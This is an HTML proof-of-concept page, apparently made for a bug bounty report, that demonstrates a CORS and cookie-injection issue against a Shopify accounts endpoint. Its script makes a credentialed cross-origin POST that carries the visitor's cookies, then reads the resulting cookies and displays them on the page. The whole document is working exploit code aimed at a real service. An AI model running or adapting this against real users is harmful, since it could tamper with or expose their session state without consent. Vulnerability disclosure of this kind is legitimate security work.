<!DOCTYPE html>
<html>
<body>
<h1>Shopify CORS + Cookie Injection PoC</h1>
<script>
(async () => {
    // Step 1 — Trigger Shopify vulnerable endpoint
    await fetch("https://accounts.shopify.com/.well-known/dux", {
        method: "POST",
        credentials: "include", // include victim's cookies
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify({
            multiTrackToken: "test",
            sessionToken: "test",
            enableActiveConsent: false,
            enableProtoEventForwarding: false,
            events: []
        })
    });

    // Step 2 — Read cookies now set for your GitHub Pages domain
    const cookies = document.cookie;

    // Step 3 — Display cookies on the page (safe for bug bounty)
    document.body.innerHTML = "<h2>Injected Cookies:</h2><pre>" + cookies + "</pre>";
})();
</script>
</body>
</html>
